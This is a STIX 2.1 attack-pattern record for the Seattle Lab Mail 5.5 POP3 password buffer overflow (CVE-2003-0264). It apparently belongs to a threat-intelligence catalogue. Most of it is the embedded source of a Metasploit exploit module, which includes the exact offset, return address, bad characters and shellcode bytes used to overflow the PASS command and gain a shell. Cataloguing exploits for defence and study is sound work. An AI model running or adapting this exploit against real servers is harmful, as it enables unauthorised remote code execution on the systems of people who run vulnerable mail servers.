{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae8b54c6-a8e2-474c-b089-9003a676997e",
    "created": "2024-08-14T16:56:43.789731Z",
    "modified": "2024-08-14T16:56:43.789735Z",
    "name": "Seattle Lab Mail 5.5 POP3 Buffer Overflow",
    "description": " There exists an unauthenticated buffer overflow vulnerability in the POP3 server of Seattle Lab Mail 5.5 when sending a password with excessive length.  Successful exploitation should not crash either the service or the server; however, after initial use the port cannot be reused for successive exploitation until the service has been restarted. Consider using a command execution payload following the bind shell to restart the service if you need to reuse the same port.  The overflow appears to occur in the debugging/error reporting section of the slmail.exe executable, and there are multiple offsets that will lead to successful exploitation. This exploit uses 2606, the offset that creates the smallest overall payload. The other offset is 4654.  The return address is overwritten with a \"jmp esp\" call from the application library SLMFC.DLL found in %SYSTEM%\\\\system32\\\\. This return address works against all version of Windows and service packs.  The last modification date on the library is dated 06/02/99. Assuming that the code where the overflow occurs has not changed in some time prior version of SLMail may also be vulnerable with this exploit. The author has not been able to acquire older versions of SLMail for testing purposes. Please let us know if you were able to get this exploit working against other SLMail versions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/pop3/seattlelab_pass.rb",
            "external_id": "seattlelab_pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0264"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Seattle Lab Mail 5.5 POP3 Buffer Overflow',\n      'Description'    => %q{\n          There exists an unauthenticated buffer overflow vulnerability\n        in the POP3 server of Seattle Lab Mail 5.5 when sending a password\n        with excessive length.\n\n        Successful exploitation should not crash either the\n        service or the server; however, after initial use the\n        port cannot be reused for successive exploitation until\n        the service has been restarted. Consider using a command\n        execution payload following the bind shell to restart\n        the service if you need to reuse the same port.\n\n        The overflow appears to occur in the debugging/error reporting\n        section of the slmail.exe executable, and there are multiple\n        offsets that will lead to successful exploitation. This exploit\n        uses 2606, the offset that creates the smallest overall payload.\n        The other offset is 4654.\n\n        The return address is overwritten with a \"jmp esp\" call from the\n        application library SLMFC.DLL found in %SYSTEM%\\\\system32\\\\. This\n        return address works against all version of Windows and service packs.\n\n        The last modification date on the library is dated 06/02/99. Assuming\n        that the code where the overflow occurs has not changed in some time,\n        prior version of SLMail may also be vulnerable with this exploit. The\n        author has not been able to acquire older versions of SLMail for\n        testing purposes. Please let us know if you were able to get this\n        exploit working against other SLMail versions.\n      },\n      'Author'         => 'stinko',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-0264'],\n          ['OSVDB', '11975'],\n          ['BID', '7519'],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'MinNops'  => 100,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows NT/2000/XP/2003 (SLMail 5.5)', { 'Ret' => 0x5f4a358f, 'Offset' => 2606 } ]\n        ],\n      'DisclosureDate' => '2003-05-07',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(110)\n      ])\n\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying #{target.name} using jmp esp at #{\"%.8x\" % target.ret}\")\n\n    banner = sock.get_once || ''\n    if banner !~ /^\\+OK POP3 server (.*) ready/\n      print_error(\"POP3 server does not appear to be running\")\n      return\n    end\n\n    sock.put(\"USER #{rand_text_alphanumeric(10)}\\r\\n\")\n    banner = sock.get_once\n    if banner !~ /^\\+OK (.*) welcome here/\n      print_error(\"POP3 server rejected username\")\n      return\n    end\n\n    request  = \"PASS \" + rand_text_alphanumeric(target['Offset'] - payload.encoded.length)\n    request << payload.encoded\n    request << [target.ret].pack('V')\n    request << \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\" # fix the stack\n    request << \"\\xe9\\xcb\\xfd\\xff\\xff\"         # go back 560 bytes\n    request << rand_text_alphanumeric(512)         # cruft\n    request << \"\\r\\n\"\n\n    sock.put(request)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-05-07",
    "x_mitre_platforms": [
        "win'"
    ]
}